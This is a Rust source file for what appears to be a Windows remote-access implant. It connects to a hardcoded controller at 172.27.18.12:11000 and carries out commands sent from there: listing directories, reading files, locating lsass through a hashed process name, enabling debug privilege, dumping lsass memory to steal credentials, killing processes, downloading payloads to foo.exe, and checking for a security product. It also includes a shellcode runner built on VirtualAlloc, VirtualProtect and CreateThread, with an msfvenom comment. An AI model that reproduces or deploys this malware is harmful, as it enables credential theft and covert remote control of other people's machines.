mod minidump;

use std::fs::File;
use native_tls::TlsConnector;
extern crate kernel32;
use winapi::um::winnt::TOKEN_QUERY;
use datetime;
use json;
use native_tls::TlsStream;
use std::{io, mem};
use std::fmt::format;
use winapi::shared::minwindef::LPVOID;
use std::io::prelude::*;
use std::io::{stdin, stdout, BufReader, Read, Write};
use std::net::TcpStream;
use std::fs;
use std::os::windows::raw::HANDLE;
use std::path::Path;
use std::pin::Pin;
use std::process;
use std::process::Command;
use std::ptr;
use std::ptr::null_mut;
use std::str::from_utf8;
use std::thread;
use std::time::Duration;
use winapi::ctypes::c_void;
use winapi::shared::minwindef::DWORD;
use winapi::um::errhandlingapi;
use winapi::um::processthreadsapi;
use winapi::um::processthreadsapi::{GetCurrentProcess, GetExitCodeThread, OpenProcessToken};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase;
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    PROCESS_ALL_ACCESS, PVOID,
};
use local_ip_address::local_ip;
use std::sync::mpsc::{Sender, Receiver};
use std::sync::mpsc;
use kernel32::{CloseHandle, GetModuleFileNameA, GetModuleHandleA};
use winapi::um::errhandlingapi::GetLastError;
use json::object;
use winapi::um::winbase::{GetUserNameA, LookupPrivilegeNameA};
use winapi::um::winnt::TOKEN_ELEVATION;
use std::collections::hash_map::DefaultHasher;
use std::ffi::OsString;
use std::hash::{Hash, Hasher};
use winapi::um::libloaderapi::GetModuleFileNameW;



static NTHREADS: i32 = 3;

fn get_stream() -> TcpStream {
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();//
    println!("hello :)");

    let mut stream = TcpStream::connect("172.27.18.12:11000").unwrap();
    println!("hello :)");

    //stream.write("fucker".as_ref()).expect("TODO: panic message");
    //stream.read(&mut [0; 128]).expect("TODO: panic message");
    return stream;
}
//



use winapi::um::winnt::TokenElevation;



fn create_thread() {
    //┌──(kali㉿kali)-[~/Desktop]
    //└─$ msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
    let test: [u8; 17] = [
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00,
        0x00, 0xc3,
    ];
    /*[ 0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b,
    0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2,
    0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b,
    0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04,
    0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0,
    0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2,
    0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6];*/
    // allocate base addr as RW

    unsafe {
        let base_addr = kernel32::VirtualAlloc(
            ptr::null_mut(),
            test.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if base_addr.is_null() {
            println!("[-] Couldn't allocate memory to current proc.")
        } else {
            println!("[+] Allocated memory to current proc.");
        }

        // copy shellcode into mem
        println!("[*] Copying Shellcode to address in current proc.");

        std::ptr::copy(test.as_ptr() as _, base_addr, test.len());

        println!("[*] Copied...");

        // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`

        println!("[*] Changing mem protections to RX...");

        let mut old_protect: DWORD = PAGE_READWRITE;

        let mem_protect = kernel32::VirtualProtect(
            base_addr,
            test.len() as u64,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if mem_protect == 0 {
            let error = errhandlingapi::GetLastError();
            println!("[-] Error: {}", error.to_string());
            process::exit(0x0100);
        }

        // Call CreateThread
        println!("[*] Calling CreateThread...");

        let mut tid = 0;
        let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
        struct Params {
            param1: u32,
        }
        let mut params = Params{param1:56};
        let param_ptr: *mut c_void = &mut params as *mut _ as *mut c_void;
        type RemoteThreadProc = unsafe extern "system" fn(u32) -> u32;

        let h_thread = processthreadsapi::CreateThread(
            ptr::null_mut(),
            0,
            Some(ep),
            param_ptr,
            0,
            &mut tid,
        );

        if h_thread.is_null() {
            let error = unsafe { errhandlingapi::GetLastError() };
            println!("{}", error.to_string())
        } else {
            println!("[+] Thread Id: {}", tid)
        }

        // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running

        println!("[*] Calling WaitForSingleObject...");

        let status = WaitForSingleObject(h_thread, winbase::INFINITE);
        if status == 0 {
            println!("[+] Good!")
        } else {
            let error = errhandlingapi::GetLastError();
            println!("{}", error.to_string())
        }
        let mut exit = 0_u32;
        let res = GetExitCodeThread(h_thread, &mut exit as _);
    }
}

fn start_receiver(rx:Receiver<String>) {
    thread::spawn(move || {
        // The thread takes ownership over `thread_tx`
        // Each thread queues a message in the channel
        let mut ids = Vec::with_capacity(100);
        loop {
            // The `recv` method picks a message from the channel
            // `recv` will block the current thread if there are no messages available
            ids.push(rx.recv());
            let message=ids.pop().unwrap().unwrap();
            println!("received {:?}", message);

            let s_slice: &str = &message[..];

            let res=json::parse(s_slice).unwrap();
            println!("command is {:?}", res["data"]);


        }
        // Sending is a non-blocking operation, the thread will continue
        // immediately after sending its message
    });
}

//todo test
fn start_listener(thread_tx:Sender<String>, mut stream:TlsStream<TcpStream>){
    let to_sleep = Duration::from_secs(1);

    loop {
        std::thread::sleep(to_sleep);
        let mut line = [0; 100];
        let res = stream.read(&mut line);

        match res {
            Ok(n) => {
                println!("Bytes ricevuti: {:?}\n", &line[0..n]);
                println!("Testo: {}", from_utf8(&line).unwrap());
                println!("Lunghezza bytes: {}\n", n);
                let val = String::from(from_utf8(&line).unwrap());
                thread_tx.send(val).unwrap();

            },
            Err(e) => {
                println!("Nothing to read");
                let val = String::from("Nothing to read 2");
                thread_tx.send(val).unwrap();
                continue
            }
        }

    }
}
use std::os::windows::ffi::OsStringExt;
use winapi::um::winnt::TOKEN_PRIVILEGES;
use winapi::um::winnt::TokenPrivileges;
use process_path::get_executable_path;
use base64::{Engine as _, engine::general_purpose};
use crate::minidump::in_memory_dump;

use paranoid_hash::ParanoidHash;
fn getUsername(thread_tx:Sender<String>) {

    let mut buf: Vec<u16> = vec![0; 64];
    let mut sz: DWORD = 60;
    unsafe {
        advapi32::GetUserNameW(buf.as_mut_ptr(), &mut sz);
    }
    thread_tx.send(String::from_utf16(&buf).unwrap());
}


fn getTasks(thread_tx:Sender<String>) {

    let mut buf: Vec<u16> = vec![0; 64];
    let mut sz: DWORD = 60;
    unsafe {
        advapi32::GetUserNameW(buf.as_mut_ptr(), &mut sz);
    }
    thread_tx.send(String::from_utf16(&buf).unwrap());
}

fn start_control(thread_tx:Sender<String>, thread_rx:Receiver<String>){


        // The thread takes ownership over `thread_tx`
        // Each thread queues a message in the channel
        let mut ids = Vec::with_capacity(100);
        loop {
            let mut pid: String=String::from("0");;
            let mut lspid=0;
            // The `recv` method picks a message from the channel
            // `recv` will block the current thread if there are no messages available
            ids.push(thread_rx.recv());
            let message=ids.pop().unwrap().unwrap();

            let parsed=json::parse(&*message).unwrap();
            println!("received {:?}", parsed["command_in"]);

            let mut iterator =parsed["command_in"].as_str().unwrap().split_whitespace();
            let mut order=iterator.next();
            let mut s = String::new();

            let (taskSender, taskReceiver) = mpsc::channel::<String>();
            let (nameSender, nameReceiver) = mpsc::channel::<String>();
            let (seSender, seReceiver) = mpsc::channel::<String>();
            let (krlSenderWorker, krlReceiverWorker) = mpsc::channel::<String>();
            let (krlSender, krlReceiver) = mpsc::channel::<String>();
            let (snSender, snReceiver) = mpsc::channel::<String>();
            let (snSenderWorker, snReceiverWorker) = mpsc::channel::<String>();
            let (knSender, knReceiver) = mpsc::channel::<String>();
            let (knSenderWorker, knReceiverWorker) = mpsc::channel::<String>();
            let (ipSender, ipReceiver) = mpsc::channel::<String>();
            let (dlSender, dlReceiver) = mpsc::channel::<String>();
            let (dlSenderWorker, dlReceiverWorker) = mpsc::channel::<String>();
            let (wdSender, wdReceiver) = mpsc::channel::<String>();
            let (wherSender, wherReceiver) = mpsc::channel::<String>();


            if order.unwrap().eq("dir")
            {
                let dir=fs::read_dir(iterator.next().unwrap()).unwrap();
                for path in dir {
                    if(path.as_ref().unwrap().path().is_dir()){
                        s.push_str("DIR ");
                    }
                    else {
                        s.push_str("    ");

                    }
                    s.push_str(path.unwrap().path().to_str().unwrap());  // note the reassignment
                    s.push_str("\n");
                }
                println!("Name: {}",s );

            }
            else if order.unwrap().eq("type")
            {

                let mut file = File::open(iterator.next().unwrap());
                file.expect("IDIOT").read_to_string(&mut s);
                println!("Contents: {}",s );
            }
            else if order.unwrap().eq("whoami")
            {
                thread::spawn(move || unsafe {
                    getUsername(nameSender)
                });
                s=nameReceiver.recv().unwrap();

            }
            else if order.unwrap().eq("tsks")
            {

                unsafe{
                    let tl = tasklist::Tasklist::new();
                    for i in tl{

                        s=s+ &*format!("{:?} {:?}\n", i.get_pid(), i.get_pname());

                        let context = ParanoidHash::default();
                        let (blake2b,shasha) = context.read_str(i.get_pname());
                        let lsexe: String = "9CDC6E986DBA9069498F3196AE5EFD770DC071240E267202F056765C7F6D85806356109F7E008D550E9712793EA2F15671B299A38E29B7E9BC50A61A74CA4A78".parse().unwrap();

                        if(blake2b==lsexe)
                        {
                            pid= i.get_pid().to_string().replace("7","l").replace("8","k").replace("9","f");
                            println!("found lsass, {:?}", pid);
                        }


                    }
                }

                let path = "results.txt";
                let mut output = File::create(path).unwrap();
                write!(output, "{}", s).expect("TODO: panic message");
                s=pid;
                println!("{:?}",s);


            }
            else if order.unwrap().eq("se")
            {

                unsafe{
                    s = tasklist::enable_debug_priv().to_string();

                }
                println!("{:?}",s);


            }
            else if order.unwrap().eq("krl")
            {

                println!("{:?}",lspid);

                unsafe{

                    s = in_memory_dump((pid.to_string().replace("l","7").replace("k","8").replace("f","9").parse::<u32>().unwrap()));

                }


                println!("{:?}",s);


            }
            else if order.unwrap().eq("sn")
            {
                unsafe{
                    let tl = tasklist::Tasklist::new();
                    let a=iterator.next().unwrap();
                    for i in tl{
                        println!("{:?}",i);

                        if a==i.get_pname(){
                            println!("{:?}",i.get_pid());
                            s=i.get_pid().to_string()+" "+&i.get_pname()+" "+&i.get_user();
                        }

                    }
                }
            }
            else if (order.unwrap().eq("kn"))
            {
                unsafe{
                    let tl = tasklist::Tasklist::new();
                    let a=iterator.next().unwrap();

                    for i in tl{
                        println!("{:?}",i);

                        if a==i.get_pname(){
                            s=i.kill().to_string();
                            println!("{:?}",s);

                        }

                    }
                }
            }
            else if (order.unwrap().eq("ip"))
            {
                let my_local_ip = local_ip().unwrap();

                s=my_local_ip.to_string();
            }
            else if (order.unwrap().eq("dl"))
            {
                let a=iterator.next().unwrap();
                let resp = reqwest::blocking::get(a).expect("dio").text().unwrap();
                let decoded = general_purpose::STANDARD_NO_PAD.decode(resp).unwrap();

                // ... later in code
                let bytes = std::fs::read("./my.bin").unwrap();

                let path = "foo.exe";
                let mut output = File::create(path).unwrap();
                write!(output, "{:?}", decoded).expect("TODO: panic message");
                println!("{:?}",decoded);

            }
            else if (order.unwrap().eq("wd"))
            {
                unsafe{
                    let tl = tasklist::Tasklist::new();

                    for i in tl{

                        let context = ParanoidHash::default();
                        let (blake2b,shasha) = context.read_str(i.get_pname());
                        println!("{:?}",blake2b);
                        if(blake2b=="63642B7A97E5C3443ACE800E0288933D53E87FFAC9AB7896A0383F03DDFF807AB3BC536E13326F7A7DF771817BB35258C7CF276C73BE5B4071A8C63027A695B7")
                        {
                            s= "yes".parse().unwrap();
                            break;
                        }
                        s="no".parse().unwrap();
                    }
                }
            }else if (order.unwrap().eq("wher"))
            {
                s=get_executable_path().unwrap().to_str().unwrap().to_string();
            }



            let mut data = object!{
                            controller_id: "gian",
                            command_in: parsed["command_in"].clone(),
                            command_out: s
                        };

            thread_tx.send(data.to_string());






        }
        // Sending is a non-blocking operation, the thread will continue
        // immediately after sending its message


}

fn main() {
/*
    let bytes = std::fs::read("./foo.exe");
    //let encoded = general_purpose::STANDARD_NO_PAD.encode(&bytes.unwrap());
    let decoded = general_purpose::STANDARD_NO_PAD.decode(&bytes.unwrap());

    let path = "baster.exe";
    let mut output = File::create(path).unwrap();
    let mut file = File::create("test");
    file.expect("dio").write_all(&*decoded.unwrap());
*/


    let mut stream = get_stream();


    //stream.write_all(b"12340").unwrap();
    stream.write_all(b"gian").unwrap();



    let stream2 = Pin::new(&stream).get_ref();
    let to_sleep = Duration::from_secs(1);
    stream2.set_read_timeout(Some(to_sleep));


    let (tx, rx) = mpsc::channel::<String>();
    let (txWorker, rxWorker) = mpsc::channel::<String>();

    thread::spawn(move || unsafe {
        start_control(txWorker,rx)
    });

    println!("hello :)");
    let thread_tx = tx.clone();

    loop {
        std::thread::sleep(to_sleep);
        let mut line = [0; 4096];
        let res = stream.read(&mut line);

        match res {
            Ok(n) => {

                if n!=0 {
                    let mut val = String::from(from_utf8(&line).unwrap());
                    val.truncate(n);
                    thread_tx.send(val).unwrap();
                    let back= json::from(rxWorker.recv().unwrap());
                    println!("sending {:?}",back);
                    stream.write(back.to_string().as_ref());

                }
                else{
                    println!("IM DEAD x(");
                }


            },
            Err(e) => {
                let val = String::from("{\"controller_id\": \"gian\", \"command_in\": \"dir ./\"}");
                //println!("chilling");
                //thread_tx.send(val).expect("TODO: panic message");
                continue
            }
        }

    }

}
